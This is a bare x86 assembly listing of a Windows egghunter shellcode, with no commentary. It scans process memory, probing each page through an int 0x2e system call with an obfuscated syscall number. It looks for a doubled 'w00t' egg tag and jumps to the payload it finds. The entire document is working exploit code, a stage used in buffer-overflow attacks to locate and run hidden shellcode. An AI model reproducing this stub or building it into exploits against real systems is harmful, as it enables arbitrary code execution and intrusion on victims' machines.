loop_inc_page:
    or dx, 0x0fff       	;
loop_inc_one:
	inc edx             	;
loop_check:
    push edx            	;
    mov eax, 0xfffffe3a 	;
	neg eax             	;
	int 0x2e		;
	cmp al,05		;
	pop edx 		;
loop_check_valid:
	je loop_inc_page	;
is_egg:
    mov eax, 0x74303077		;
	mov edi, edx		;
	scasd			;
	jnz loop_inc_one	;
	scasd			;
	jnz loop_inc_one	;
matched:				 
	jmp edi			;
